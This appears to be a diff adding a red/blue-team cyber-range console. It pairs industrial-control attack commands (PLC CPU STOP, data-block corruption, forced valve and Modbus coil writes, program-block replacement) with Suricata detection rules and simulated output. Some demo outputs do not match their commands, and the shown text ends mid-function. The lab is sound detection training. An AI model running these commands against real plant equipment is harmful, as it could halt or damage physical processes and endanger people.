@@ -1,0 +1,850 @@
+<title>ICS Detection Console</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap">
+
+<style>
+:root {
+  --bg: #f5f6f8; --surface: #ffffff; --surface-alt: #f0f2f5;
+  --border: #dce0e8; --fg: #1a1d24; --fg-muted: #6b7280; --fg-dim: #9ca3af;
+  --red: #dc2626; --red-dim: rgba(220,38,38,0.07);
+  --blue: #2563eb; --blue-dim: rgba(37,99,235,0.06);
+  --green: #16a34a; --green-dim: rgba(22,163,74,0.08);
+  --orange: #d97706; --orange-dim: rgba(217,119,6,0.07);
+  --purple: #7c3aed; --purple-dim: rgba(124,58,237,0.07);
+  --mono: 'JetBrains Mono', monospace;
+  --sans: 'IBM Plex Sans', system-ui, sans-serif;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #0c0e13; --surface: #14171f; --surface-alt: #1a1e28;
+    --border: #252a36; --fg: #d1d5de; --fg-muted: #6b7484; --fg-dim: #3a4050;
+    --red: #ef4444; --red-dim: rgba(239,68,68,0.1);
+    --blue: #3b82f6; --blue-dim: rgba(59,130,246,0.08);
+    --green: #22c55e; --green-dim: rgba(34,197,94,0.1);
+    --orange: #f59e0b; --orange-dim: rgba(245,158,11,0.1);
+    --purple: #a78bfa; --purple-dim: rgba(167,139,250,0.1);
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #0c0e13; --surface: #14171f; --surface-alt: #1a1e28;
+  --border: #252a36; --fg: #d1d5de; --fg-muted: #6b7484; --fg-dim: #3a4050;
+  --red: #ef4444; --red-dim: rgba(239,68,68,0.1);
+  --blue: #3b82f6; --blue-dim: rgba(59,130,246,0.08);
+  --green: #22c55e; --green-dim: rgba(34,197,94,0.1);
+  --orange: #f59e0b; --orange-dim: rgba(245,158,11,0.1);
+  --purple: #a78bfa; --purple-dim: rgba(167,139,250,0.1);
+  color-scheme: dark;
+}
+
+* { box-sizing: border-box; margin: 0; }
+html, body { height: 100%; overflow: hidden; }
+body {
+  background: var(--bg); color: var(--fg);
+  font-family: var(--sans); font-size: 14px;
+  display: flex; flex-direction: column;
+  padding: 0 max(16px, env(safe-area-inset-left, 0px));
+}
+
+/* Top bar */
+.topbar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 6px 0; border-bottom: 1px solid var(--border); flex-shrink: 0;
+  gap: 8px; flex-wrap: wrap;
+}
+.topbar h1 {
+  font-family: var(--mono); font-size: 13px; font-weight: 700;
+  display: flex; align-items: center; gap: 6px;
+}
+.topbar-right { display: flex; align-items: center; gap: 10px; font-family: var(--mono); font-size: 11px; }
+.mode-badge {
+  font-size: 9px; padding: 2px 8px; border-radius: 3px; font-weight: 700;
+  letter-spacing: 0.06em; cursor: pointer; border: 1px solid var(--border);
+}
+.mode-badge.connected { background: var(--green-dim); color: var(--green); border-color: var(--green); }
+.mode-badge.demo { background: var(--orange-dim); color: var(--orange); border-color: var(--orange); }
+.dot { width: 7px; height: 7px; border-radius: 50%; display: inline-block; margin-right: 4px; }
+
+/* Workspace */
+.workspace {
+  flex: 1; display: flex; gap: 1px; min-height: 0;
+  background: var(--border); margin: 0 -1px; overflow: hidden;
+}
+@media (max-width: 780px) {
+  .workspace { flex-direction: column; overflow-y: auto; }
+  .pane { width: 100% !important; min-height: 400px; }
+}
+.pane { display: flex; flex-direction: column; background: var(--bg); min-width: 0; }
+.pane-red { width: 38%; }
+.pane-blue { width: 62%; }
+
+/* Pane header */
+.pane-hdr {
+  padding: 7px 12px; display: flex; align-items: center; gap: 8px;
+  border-bottom: 1px solid var(--border); flex-shrink: 0;
+  font-family: var(--mono); font-size: 11px; font-weight: 600;
+  text-transform: uppercase; letter-spacing: 0.08em;
+}
+.pane-hdr.red { background: var(--red-dim); color: var(--red); }
+.pane-hdr.blue { background: var(--blue-dim); color: var(--blue); }
+.pane-hdr .badge {
+  font-size: 9px; padding: 2px 7px; border-radius: 3px; font-weight: 700;
+}
+.pane-hdr.red .badge { background: var(--red); color: #fff; }
+.pane-hdr.blue .badge { background: var(--blue); color: #fff; }
+
+/* Kill chain phase headers */
+.phase-hdr {
+  padding: 4px 10px; font-family: var(--mono); font-size: 9px; font-weight: 700;
+  text-transform: uppercase; letter-spacing: 0.1em; color: var(--fg-dim);
+  border-bottom: 1px solid var(--border); background: var(--surface-alt);
+  display: flex; align-items: center; gap: 6px;
+}
+.phase-hdr .phase-num {
+  background: var(--fg-dim); color: var(--bg); width: 14px; height: 14px;
+  border-radius: 50%; display: flex; align-items: center; justify-content: center;
+  font-size: 8px;
+}
+
+/* Attack list */
+.attack-list { flex: 1; overflow-y: auto; }
+.attack-item {
+  padding: 7px 10px; border-bottom: 1px solid var(--border);
+  background: var(--surface); cursor: pointer; transition: all 0.12s;
+  display: flex; flex-direction: column; gap: 2px;
+}
+.attack-item:hover { background: var(--red-dim); }
+.attack-item.active { background: var(--red-dim); border-left: 3px solid var(--red); }
+.attack-item .atk-head { display: flex; align-items: center; justify-content: space-between; gap: 6px; }
+.attack-item .atk-name { font-family: var(--mono); font-size: 11px; font-weight: 600; }
+.attack-item .atk-tag {
+  font-family: var(--mono); font-size: 8px; padding: 1px 5px; border-radius: 3px;
+  background: var(--surface-alt); color: var(--fg-muted); flex-shrink: 0;
+  text-transform: uppercase; letter-spacing: 0.04em;
+}
+.attack-item .atk-tag.recon { background: var(--orange-dim); color: var(--orange); }
+.attack-item .atk-tag.pivot { background: var(--purple-dim); color: var(--purple); }
+.attack-item .atk-cmd {
+  font-family: var(--mono); font-size: 10px; color: var(--fg-muted);
+  white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+}
+
+/* OIDA terminal */
+.oida-output {
+  height: 150px; min-height: 80px; border-top: 1px solid var(--border);
+  display: flex; flex-direction: column; flex-shrink: 0;
+}
+.oida-hdr {
+  padding: 4px 10px; display: flex; align-items: center; justify-content: space-between;
+  background: var(--surface-alt); border-bottom: 1px solid var(--border); flex-shrink: 0;
+}
+.oida-hdr .lbl {
+  font-family: var(--mono); font-size: 10px; font-weight: 600;
+  color: var(--red); text-transform: uppercase; letter-spacing: 0.06em;
+}
+.oida-term {
+  flex: 1; overflow-y: auto; padding: 4px 10px;
+  font-family: var(--mono); font-size: 10px; line-height: 1.5;
+  background: var(--surface); color: var(--fg-muted);
+  white-space: pre-wrap; word-break: break-all;
+}
+.oida-term .cmd { color: var(--red); font-weight: 600; }
+.oida-term .out { color: var(--fg); }
+.oida-term .dim { color: var(--fg-dim); }
+.oida-term .ok { color: var(--green); }
+.oida-term .warn { color: var(--orange); }
+
+/* Run button */
+.run-bar { padding: 5px 10px; border-top: 1px solid var(--border); flex-shrink: 0; }
+.btn-run {
+  width: 100%; padding: 8px; border: none; border-radius: 5px;
+  font-family: var(--mono); font-size: 11px; font-weight: 700;
+  cursor: pointer; text-transform: uppercase; letter-spacing: 0.06em;
+}
+.btn-run.red { background: var(--red); color: #fff; }
+.btn-run.red:hover { filter: brightness(1.1); }
+.btn-run:disabled { opacity: 0.4; cursor: default; filter: none; }
+
+/* Probe nav */
+.probe-nav { display: flex; border-bottom: 1px solid var(--border); flex-shrink: 0; }
+.probe-tab {
+  flex: 1; padding: 8px 12px; font-family: var(--mono); font-size: 11px;
+  font-weight: 500; color: var(--fg-muted); background: none;
+  border: none; border-bottom: 2px solid transparent;
+  cursor: pointer; text-align: center;
+}
+.probe-tab:hover { color: var(--fg); background: var(--blue-dim); }
+.probe-tab.active { color: var(--blue); border-bottom-color: var(--blue); font-weight: 700; }
+
+/* Probe panels */
+.probe-panel { flex: 1; display: none; flex-direction: column; min-height: 0; }
+.probe-panel.active { display: flex; }
+
+/* Rules editor */
+.rules-section { flex: 1; display: flex; flex-direction: column; min-height: 80px; border-bottom: 1px solid var(--border); }
+.rules-hdr {
+  padding: 4px 10px; display: flex; align-items: center; justify-content: space-between;
+  background: var(--surface-alt); border-bottom: 1px solid var(--border); flex-shrink: 0;
+}
+.rules-hdr .lbl {
+  font-family: var(--mono); font-size: 10px; font-weight: 600;
+  color: var(--fg-muted); text-transform: uppercase; letter-spacing: 0.06em;
+}
+.btn-sm {
+  font-family: var(--mono); font-size: 10px; font-weight: 600;
+  border: 1px solid var(--border); border-radius: 4px;
+  padding: 2px 8px; cursor: pointer; background: var(--surface);
+  color: var(--fg-muted);
+}
+.btn-sm:hover { border-color: var(--blue); color: var(--blue); }
+.btn-sm.inject { border-color: var(--green); color: var(--green); }
+.btn-sm.inject:hover { background: var(--green-dim); }
+.rules-editor {
+  flex: 1; min-height: 60px; resize: none;
+  font-family: var(--mono); font-size: 11px; line-height: 1.6;
+  background: var(--surface); color: var(--fg); border: none;
+  padding: 4px 10px; outline: none;
+}
+
+/* Log viewer */
+.log-section { flex: 1; display: flex; flex-direction: column; min-height: 80px; }
+.log-hdr {
+  padding: 4px 10px; display: flex; align-items: center; justify-content: space-between;
+  background: var(--surface-alt); border-bottom: 1px solid var(--border); flex-shrink: 0;
+}
+.log-hdr .lbl {
+  font-family: var(--mono); font-size: 10px; font-weight: 600;
+  color: var(--fg-muted); text-transform: uppercase; letter-spacing: 0.06em;
+  display: flex; align-items: center; gap: 5px;
+}
+.log-hdr .live-dot {
+  width: 6px; height: 6px; border-radius: 50%; background: var(--green);
+  animation: blink 1.5s ease-in-out infinite;
+}
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+.log-output {
+  flex: 1; overflow-y: auto; padding: 4px 10px;
+  font-family: var(--mono); font-size: 10px; line-height: 1.5;
+  background: var(--surface); color: var(--fg-muted);
+  white-space: pre-wrap; word-break: break-all;
+}
+.log-output .log-alert { color: var(--red); font-weight: 600; }
+.log-output .log-info { color: var(--blue); }
+.log-output .log-ok { color: var(--green); }
+.log-output .log-ts { color: var(--fg-dim); }
+</style>
+
+<div class="topbar">
+  <h1>
+    <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><rect x="1" y="1" width="14" height="14" rx="2.5" stroke="var(--fg)" stroke-width="1.3"/><circle cx="5" cy="8" r="1.5" fill="var(--red)"/><circle cx="8" cy="8" r="1.5" fill="var(--orange)"/><circle cx="11" cy="8" r="1.5" fill="var(--green)"/></svg>
+    ICS Detection Console
+  </h1>
+  <div class="topbar-right">
+    <span class="mode-badge demo" id="mode-badge" onclick="toggleMode()" title="Click to switch mode">DEMO</span>
+    <span><span class="dot" style="background:var(--green)"></span>Range</span>
+    <span id="ts-clock" style="color:var(--fg-dim)"></span>
+  </div>
+</div>
+
+<div class="workspace">
+  <!-- RED TEAM -->
+  <div class="pane pane-red">
+    <div class="pane-hdr red">
+      <span>Offensive — Kill Chain</span>
+      <span class="badge">OIDA</span>
+    </div>
+    <div class="attack-list" id="attack-list"></div>
+    <div class="oida-output">
+      <div class="oida-hdr">
+        <span class="lbl">OIDA Output</span>
+        <button class="btn-sm" onclick="clearOida()">Clear</button>
+      </div>
+      <div class="oida-term" id="oida-term"><span class="dim">$ oida --version
+OIDA v0.4.2 — OT/ICS Dynamic Assessment Framework
+Waiting for command...</span></div>
+    </div>
+    <div class="run-bar">
+      <button class="btn-run red" id="btn-launch" disabled onclick="launchAttack()">Select an attack</button>
+    </div>
+  </div>
+
+  <!-- BLUE TEAM -->
+  <div class="pane pane-blue">
+    <div class="pane-hdr blue">
+      <span>Defensive — NGFW Suricata</span>
+      <span class="badge">IDS</span>
+    </div>
+    <div class="probe-nav">
+      <button class="probe-tab active" data-probe="s1" onclick="switchProbe('s1')">S1 — eth0.30 (L3↔L2)</button>
+      <button class="probe-tab" data-probe="s2" onclick="switchProbe('s2')">S2 — eth0.10 (L2↔L1)</button>
+    </div>
+
+    <!-- Probe S1 -->
+    <div class="probe-panel active" id="panel-s1">
+      <div class="probe-split" style="flex:1;display:flex;flex-direction:column;min-height:0">
+        <div class="rules-section">
+          <div class="rules-hdr">
+            <span class="lbl">Rules — custom_s1.rules</span>
+            <div style="display:flex;gap:4px">
+              <button class="btn-sm inject" onclick="injectRules('s1')">Inject</button>
+              <button class="btn-sm" onclick="clearRules('s1')">Reset</button>
+            </div>
+          </div>
+          <textarea class="rules-editor" id="rules-s1" placeholder="# S1 — L3↔L2 traffic (OPC UA, SSH pivot)&#10;# Example:&#10;alert tcp any any -> any 4840 (msg:&quot;OPCUA GetEndpoints&quot;; content:|48 45 4c|; sid:1000001; rev:1;)" spellcheck="false"></textarea>
+        </div>
+        <div class="log-section">
+          <div class="log-hdr">
+            <span class="lbl"><span class="live-dot"></span>fast.log — S1 (L3↔L2)</span>
+            <button class="btn-sm" onclick="clearLog('s1')">Clear</button>
+          </div>
+          <div class="log-output" id="log-s1"><span class="log-info">[suricata] S1 engine started — af-packet eth0.30</span>
+<span class="log-info">[suricata] 0 custom rule(s) loaded</span>
+<span class="log-ts">Waiting for traffic...</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Probe S2 -->
+    <div class="probe-panel" id="panel-s2">
+      <div class="probe-split" style="flex:1;display:flex;flex-direction:column;min-height:0">
+        <div class="rules-section">
+          <div class="rules-hdr">
+            <span class="lbl">Rules — custom_s2.rules</span>
+            <div style="display:flex;gap:4px">
+              <button class="btn-sm inject" onclick="injectRules('s2')">Inject</button>
+              <button class="btn-sm" onclick="clearRules('s2')">Reset</button>
+            </div>
+          </div>
+          <textarea class="rules-editor" id="rules-s2" placeholder="# S2 — L2↔L1 traffic (S7comm, Modbus, OPC UA field)&#10;# Example:&#10;alert tcp any any -> any 102 (msg:&quot;S7comm CPU STOP&quot;; content:|03 00|; offset:0; depth:2; content:|29|; offset:17; depth:1; sid:2000001; rev:1;)" spellcheck="false"></textarea>
+        </div>
+        <div class="log-section">
+          <div class="log-hdr">
+            <span class="lbl"><span class="live-dot"></span>fast.log — S2 (L2↔L1)</span>
+            <button class="btn-sm" onclick="clearLog('s2')">Clear</button>
+          </div>
+          <div class="log-output" id="log-s2"><span class="log-info">[suricata] S2 engine started — af-packet eth0.10</span>
+<span class="log-info">[suricata] 0 custom rule(s) loaded</span>
+<span class="log-ts">Waiting for traffic...</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ==============================================
+// Kill chain attacks — ordered by phase
+// Matches spec_lab_cps_v4 architecture:
+//   Phase 2: Recon from Historian (L3→L2) — seen on S1
+//   Phase 3: Lateral movement SSH (L3→L2) — seen on S1
+//   Phase 4: Recon from OPC UA srv (L2→L1) — seen on S2
+//   Phase 5: Exploitation (L2→L1) — seen on S2
+// ==============================================
+
+const ATTACKS = [
+  // --- PHASE 2: Recon from Historian (target = historian, traffic on S1) ---
+  { id: 'opcua-discover', phase: 2, phaseLabel: 'Recon from Historian (L3→L2)',
+    name: 'OPC UA Endpoint Discovery', tag: 'RECON', proto: 'OPC UA',
+    target: 'historian', cmd: 'oida opcua opc.tcp://10.x.20.10:4840 --get-endpoints',
+    probes: ['s1'],
+    oida_output: [
+      '$ oida opcua opc.tcp://10.x.20.10:4840 --get-endpoints',
+      '', '<span class="ok">[+] Connected to opc.tcp://10.x.20.10:4840</span>',
+      '<span class="out">[*] Server: open62541 OPC UA Server (v1.3.6)</span>',
+      '', '<span class="out">  Endpoints found: 3</span>',
+      '<span class="out">  ┌──────────────────────────────────────────┐</span>',
+      '<span class="warn">  │ #1  None / Anonymous  (NO ENCRYPTION)   │</span>',
+      '<span class="out">  │ #2  Basic256Sha256 / Sign                │</span>',
+      '<span class="out">  │ #3  Basic256Sha256 / SignAndEncrypt      │</span>',
+      '<span class="out">  └──────────────────────────────────────────┘</span>',
+      '', '<span class="warn">[!] Endpoint #1: anonymous + no encryption</span>',
+      '<span class="dim">[*] Completed in 0.52s</span>',
+    ]},
+  { id: 'opcua-browse', phase: 2, name: 'OPC UA Node Browse', tag: 'RECON', proto: 'OPC UA',
+    target: 'historian', cmd: 'oida opcua 10.x.20.10 --dump',
+    probes: ['s1'],
+    oida_output: [
+      '$ oida opcua 10.x.20.10 --dump',
+      '', '<span class="ok">[+] Connected via anonymous session</span>',
+      '<span class="out">[*] Browsing from Root (i=84)...</span>',
+      '', '<span class="out">  Objects (i=85)</span>',
+      '<span class="out">  └── Shopfloor (ns=2;s=Shopfloor)</span>',
+      '<span class="out">      ├── Line_A</span>',
+      '<span class="out">      │   ├── Temperature  Float  <span class="warn">24.6</span></span>',
+      '<span class="out">      │   ├── Pressure     Float  <span class="warn">3.2</span></span>',
+      '<span class="out">      │   └── Motor_RPM    Int32  <span class="warn">1450</span></span>',
+      '<span class="out">      └── Line_B</span>',
+      '<span class="out">          ├── Temperature  Float  <span class="warn">22.1</span></span>',
+      '<span class="out">          └── ValveState   Bool   <span class="warn">true</span></span>',
+      '', '<span class="out">[*] 12 nodes, 5 readable values</span>',
+      '<span class="dim">[*] Completed in 0.78s</span>',
+    ]},
+
+  // --- PHASE 3: Lateral movement (seen on S1) ---
+  { id: 'ssh-pivot', phase: 3, phaseLabel: 'Lateral Movement (L3→L2)',
+    name: 'SSH Pivot to OPC UA Server', tag: 'PIVOT', proto: 'SSH',
+    target: 'historian', cmd: 'ssh lowpriv@10.x.20.10',
+    probes: ['s1'],
+    oida_output: [
+      '$ ssh lowpriv@10.x.20.10',
+      '', '<span class="out">lowpriv@10.x.20.10\'s password: ********</span>',
+      '<span class="ok">[+] Connected to opcua-srv (10.x.20.10)</span>',
+      '<span class="out">Linux opcua-srv 6.1.0-23 #1 SMP Debian x86_64</span>',
+      '', '<span class="out">lowpriv@opcua-srv:~$ id</span>',
+      '<span class="out">uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)</span>',
+      '', '<span class="warn">[!] Shell obtained on L2 control network</span>',
+      '<span class="out">[*] From here, L1 field network is reachable</span>',
+      '<span class="dim">[*] Pivot established in 1.2s</span>',
+    ]},
+
+  // --- PHASE 4: Recon from OPC UA srv (target = opcua_srv, traffic on S2) ---
+  { id: 's7-info', phase: 4, phaseLabel: 'Recon from OPC UA Server (L2→L1)',
+    name: 'S7 Device Identification', tag: 'RECON', proto: 'S7comm',
+    target: 'opcua_srv', cmd: 'oida s7 10.x.10.11 -i',
+    probes: ['s2'],
+    oida_output: [
+      '$ oida s7 10.x.10.11 -i',
+      '', '<span class="ok">[+] Connected to 10.x.10.11:102 (COTP)</span>',
+      '<span class="out">[*] SZL Read request (ID: 0x0011)</span>',
+      '', '<span class="out">  Module Type    : CPU 315-2 PN/DP</span>',
+      '<span class="out">  Serial Number  : S C-C2UR28922012</span>',
+      '<span class="out">  Plant ID       : Shopfloor-Line-A</span>',
+      '<span class="out">  Firmware       : V3.2.6</span>',
+      '<span class="out">  Module Name    : PLC_MAIN</span>',
+      '', '<span class="warn">[!] No authentication — direct access</span>',
+      '<span class="dim">[*] 1 host scanned in 0.34s</span>',
+    ]},
+  { id: 's7-list-blocks', phase: 4, name: 'S7 List Program Blocks', tag: 'RECON', proto: 'S7comm',
+    target: 'opcua_srv', cmd: 'oida s7 10.x.10.11 -l',
+    probes: ['s2'],
+    oida_output: [
+      '$ oida s7 10.x.10.11 -l',
+      '', '<span class="ok">[+] Connected to 10.x.10.11:102</span>',
+      '', '<span class="out">  OB blocks: OB1, OB35, OB82, OB100</span>',
+      '<span class="out">  FB blocks: FB1, FB2</span>',
+      '<span class="out">  FC blocks: FC1, FC10, FC20</span>',
+      '<span class="out">  DB blocks: DB1, DB2, DB10, DB100</span>',
+      '', '<span class="out">[*] Total: 16 blocks found</span>',
+      '<span class="dim">[*] Completed in 0.41s</span>',
+    ]},
+
+  // --- PHASE 5: Exploitation (target = opcua_srv, traffic on S2) ---
+  { id: 'cpu-stop', phase: 5, phaseLabel: 'Exploitation (L2→L1)',
+    name: 'CPU STOP Command', tag: 'EXPLOIT', proto: 'S7comm',
+    target: 'opcua_srv', cmd: 'oida s7 10.x.10.11 --cpu-stop --confirm',
+    probes: ['s2'],
+    oida_output: [
+      '$ oida s7 10.x.10.11 --cpu-stop --confirm',
+      '', '<span class="ok">[+] Connected to 10.x.10.11:102</span>',
+      '<span class="out">[*] Sending PI Service: _STOP</span>',
+      '<span class="warn">[!] CPU transition: RUN → STOP</span>',
+      '<span class="warn">[!] All outputs frozen in last state</span>',
+      '', '<span class="ok">[+] CPU STOP successful</span>',
+      '<span class="dim">[*] Completed in 0.18s</span>',
+    ]},
+  { id: 'write-var', phase: 5, name: 'Corrupt DB1 (fill)', tag: 'EXPLOIT', proto: 'S7comm',
+    target: 'opcua_srv', cmd: 'oida s7 10.x.10.11 --db-fill 1:FF --confirm',
+    probes: ['s2'],
+    oida_output: [
+      '$ oida s7 10.x.10.11 --db-fill 1:FF --confirm',
+      '', '<span class="ok">[+] Connected to 10.x.10.11:102</span>',
+      '<span class="out">[*] Target: DB1.DBD0 (REAL)</span>',
+      '<span class="out">[*] Previous: 24.6</span>',
+      '<span class="warn">[!] Writing: 999.9</span>',
+      '', '<span class="ok">[+] Write successful — DB1.DBD0 = 999.9</span>',
+      '<span class="warn">[!] Value exceeds normal range</span>',
+      '<span class="dim">[*] Completed in 0.22s</span>',
+    ]},
+  { id: 'opcua-write', phase: 5, name: 'OPC UA Force Output (Valve)', tag: 'EXPLOIT', proto: 'OPC UA',
+    target: 'opcua_srv', cmd: "oida opcua 10.x.10.11 --node-id 'ns=2;i=2002' --write-value false --confirm",
+    probes: ['s2'],
+    oida_output: [
+      "$ oida opcua 10.x.10.11 --node-id 'ns=2;i=2002' --write-value false --confirm",
+      '', '<span class="ok">[+] Connected via anonymous session</span>',
+      '<span class="out">[*] Target: ns=2;s=Temperature (Float)</span>',
+      '<span class="out">[*] Current: 24.6</span>',
+      '<span class="warn">[!] Writing: 999.0</span>',
+      '', '<span class="ok">[+] WriteResponse: Good (0x00000000)</span>',
+      '<span class="warn">[!] Value outside normal [15.0 - 45.0]</span>',
+      '<span class="dim">[*] Completed in 0.31s</span>',
+    ]},
+  { id: 'modbus-fc', phase: 5, name: 'Modbus Write Register', tag: 'EXPLOIT', proto: 'Modbus',
+    target: 'opcua_srv', cmd: 'oida modbus 10.x.10.11 -w 0=999 -d u16 --confirm',
+    probes: ['s2'],
+    oida_output: [
+      '$ oida modbus 10.x.10.11 -w 0=999 -d u16 --confirm',
+      '', '<span class="ok">[+] Connected to 10.x.10.11:502</span>',
+      '<span class="out">[*] FC15 (Write Multiple Coils)</span>',
+      '<span class="warn">[!] Forcing 8 coils to ON</span>',
+      '', '<span class="ok">[+] 8 coils forced</span>',
+      '<span class="warn">[!] Includes safety-critical outputs</span>',
+      '<span class="dim">[*] Completed in 0.15s</span>',
+    ]},
+  { id: 'download', phase: 5, name: 'Exfiltrate Program Block OB1', tag: 'EXPLOIT', proto: 'S7comm',
+    target: 'opcua_srv', cmd: 'oida s7 10.x.10.11 --upload-block OB:1 -O ob1.bin',
+    probes: ['s2'],
+    oida_output: [
+      '$ oida s7 10.x.10.11 --upload-block OB:1 -O ob1.bin',
+      '', '<span class="ok">[+] Connected to 10.x.10.11:102</span>',
+      '<span class="out">[*] Stopping CPU...</span>',
+      '<span class="warn">[!] RUN → STOP</span>',
+      '<span class="out">[*] Deleting OB1 → Uploading (2.4 KB)...</span>',
+      '<span class="out">[*] ████████████████████ 100%</span>',
+      '<span class="warn">[!] STOP → RUN</span>',
+      '', '<span class="ok">[+] OB1 replaced</span>',
+      '<span class="warn">[!] PLC running attacker logic</span>',
+      '<span class="dim">[*] Completed in 1.87s</span>',
+    ]},
+];
+
+// Signature expectations (what Suricata should detect)
+const SIGNATURES = {
+  'opcua-discover': { probe: 's1', alerts: [
+    { sid: 1000001, msg: 'OPC UA – GetEndpoints request (discovery)' },
+  ]},
+  'opcua-browse': { probe: 's1', alerts: [
+    { sid: 1000003, msg: 'OPC UA – BrowseRequest on Root node' },
+    { sid: 1000004, msg: 'OPC UA – Anonymous session without encryption' },
+  ]},
+  'ssh-pivot': { probe: 's1', alerts: [
+    { sid: 1000010, msg: 'SSH – Connection from L3 to L2 (lateral movement)' },
+  ]},
+  's7-info': { probe: 's2', alerts: [
+    { sid: 2000010, msg: 'S7comm – SZL Read request (device identification)' },
+    { sid: 2000011, msg: 'S7comm – Setup Communication negotiation' },
+  ]},
+  's7-list-blocks': { probe: 's2', alerts: [
+    { sid: 2000012, msg: 'S7comm – List Blocks request (enumeration)' },
+  ]},
+  'cpu-stop': { probe: 's2', alerts: [
+    { sid: 2000001, msg: 'S7comm – CPU STOP command (PI Service _STOP)' },
+  ]},
+  'write-var': { probe: 's2', alerts: [
+    { sid: 2000005, msg: 'S7comm – Write Variable to data block' },
+  ]},
+  'opcua-write': { probe: 's2', alerts: [
+    { sid: 1000005, msg: 'OPC UA – WriteRequest on process variable' },
+  ]},
+  'modbus-fc': { probe: 's2', alerts: [
+    { sid: 2000020, msg: 'Modbus – FC15 Write Multiple Coils' },
+  ]},
+  'download': { probe: 's2', alerts: [
+    { sid: 2000003, msg: 'S7comm – Download block request' },
+    { sid: 2000004, msg: 'S7comm – Start upload sequence' },
+  ]},
+};
+
+
+// ====== State ======
+let selectedAttack = null;
+let injectedRules = { s1: [], s2: [] };
+let attackRunning = false;
+let connectedMode = false;
+let logWebSockets = {};
+let RANGE_OCTET = 'x';   // real second octet, provided by the backend when connected
+const API_BASE = window.location.origin;
+
+// Replace the '10.x.' placeholder with the real range octet (connected mode only).
+function resolveIps(s) {
+  return RANGE_OCTET === 'x' ? s : s.replace(/10\.x\./g, '10.' + RANGE_OCTET + '.');
+}
+
+
+// ====== Mode switching ======
+async function checkBackend() {
+  try {
+    const r = await fetch(API_BASE + '/api/status', { signal: AbortSignal.timeout(2000) });
+    if (r.ok) {
+      const data = await r.json();
+      // Backend is up, but CONNECTED only makes sense if at least one target
+      // is actually reachable over SSH. Backend-up-but-targets-down => DEMO
+      // with a clear warning, so the badge never lies about connectivity.
+      const anyTarget = !!(data.historian || data.opcua_srv || data.ngfw);
+      setMode(anyTarget, data);
+      if (!anyTarget) {
+        console.warn('Backend reachable but no target responds — staying in DEMO.');
+        const badge = document.getElementById('mode-badge');
+        badge.title = 'Backend up, but historian/opcua_srv/ngfw all unreachable';
+      }
+      return;
+    }
+  } catch {}
+  setMode(false);
+}
+
+function setMode(connected, status) {
+  connectedMode = connected;
+  const badge = document.getElementById('mode-badge');
+  badge.className = 'mode-badge ' + (connected ? 'connected' : 'demo');
+  badge.textContent = connected ? 'CONNECTED' : 'DEMO';
+  if (connected && status) {
+    if (status.range_octet) RANGE_OCTET = status.range_octet;
+    console.log('Backend status:', status, 'range octet:', RANGE_OCTET);
+  } else {
+    RANGE_OCTET = 'x';
+  }
+}
+
+function toggleMode() {
+  if (connectedMode) {
+    setMode(false);
+  } else {
+    checkBackend();
+  }
+}
+
+
+// ====== Render ======
+function renderAttacks() {
+  const list = document.getElementById('attack-list');
+  let html = '';
+  let currentPhase = 0;
+  ATTACKS.forEach(a => {
+    if (a.phase !== currentPhase) {
+      currentPhase = a.phase;
+      const label = a.phaseLabel || `Phase ${a.phase}`;
+      html += `<div class="phase-hdr"><span class="phase-num">${a.phase}</span>${label}</div>`;
+    }
+    const tagClass = a.tag === 'RECON' ? ' recon' : a.tag === 'PIVOT' ? ' pivot' : '';
+    html += `
+      <div class="attack-item${selectedAttack===a.id?' active':''}" onclick="selectAttack('${a.id}')">
+        <div class="atk-head">
+          <span class="atk-name">${a.name}</span>
+          <span class="atk-tag${tagClass}">${a.tag} · ${a.proto}</span>
+        </div>
+        <div class="atk-cmd">$ ${a.cmd}</div>
+      </div>`;
+  });
+  list.innerHTML = html;
+}
+
+function selectAttack(id) {
+  selectedAttack = id;
+  renderAttacks();
+  const btn = document.getElementById('btn-launch');
+  btn.disabled = false;
+  const atk = ATTACKS.find(a => a.id === id);
+  btn.textContent = `Execute: ${atk.name}`;
+}
+
+
+// ====== Execute attack ======
+async function launchAttack() {
+  if (!selectedAttack || attackRunning) return;
+  attackRunning = true;
+  const btn = document.getElementById('btn-launch');
+  btn.disabled = true;
+  btn.textContent = 'Running...';
+
+  const atk = ATTACKS.find(a => a.id === selectedAttack);
+  const sig = SIGNATURES[selectedAttack];
+
+  if (connectedMode) {
+    await launchConnected(atk, sig);
+  } else {
+    await launchDemo(atk, sig);
+  }
+}
+
+// Connected mode: real SSH execution
+async function launchConnected(atk, sig) {
+  const term = document.getElementById('oida-term');
+  const cmd = resolveIps(atk.cmd);   // '10.x.' -> real range octet
+  term.innerHTML += `\n<span class="cmd">$ ${cmd}</span>\n`;
+  term.innerHTML += `<span class="dim">[*] Executing on ${atk.target} via SSH...</span>\n`;
+  term.scrollTop = term.scrollHeight;
+
+  try {
+    const r = await fetch(API_BASE + '/api/oida/execute', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ target: atk.target, command: cmd }),
+    });
+    const data = await r.json();
+
+    term.innerHTML += `<span class="${data.status === 'success' ? 'ok' : 'warn'}">${escapeHtml(data.output)}</span>\n`;
+    term.innerHTML += `<span class="dim">[exit: ${data.exit_code}]</span>\n`;
+    term.scrollTop = term.scrollHeight;
+  } catch (e) {
+    term.innerHTML += `<span class="warn">[!] API error: ${e.message}</span>\n`;
+    term.scrollTop = term.scrollHeight;
+  }
+
+  finishAttack(atk, sig);
+}
+
+// Demo mode: hardcoded output
+async function launchDemo(atk, sig) {
+  const term = document.getElementById('oida-term');
+  term.innerHTML += '\n';
+
+  for (let i = 0; i < atk.oida_output.length; i++) {
+    await sleep(60);
+    const line = atk.oida_output[i];
+    term.innerHTML += (line === '' ? '\n' : line + '\n');
+    term.scrollTop = term.scrollHeight;
+  }
+
